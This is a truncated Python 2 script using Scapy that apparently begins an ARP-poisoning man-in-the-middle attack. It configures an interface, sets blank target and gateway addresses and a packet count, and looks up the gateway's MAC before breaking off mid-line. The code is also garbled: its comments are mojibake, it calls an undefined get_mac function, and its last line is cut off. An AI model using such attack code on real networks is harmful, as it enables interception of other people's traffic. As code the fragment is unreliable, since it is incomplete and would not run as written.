from scapy.all import *
import os
import sys
import threading
import signal

interface = "en1"
target_ip = ""
gateway_ip=""
packet_count=1000

#…Ë÷√–·ÃΩÕ¯ø®
conf.iface=interface

#πÿ±’ ‰≥ˆ
conf.verb=0
print "[*] Setting up %s" % interface

gateway_mac=get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_macget
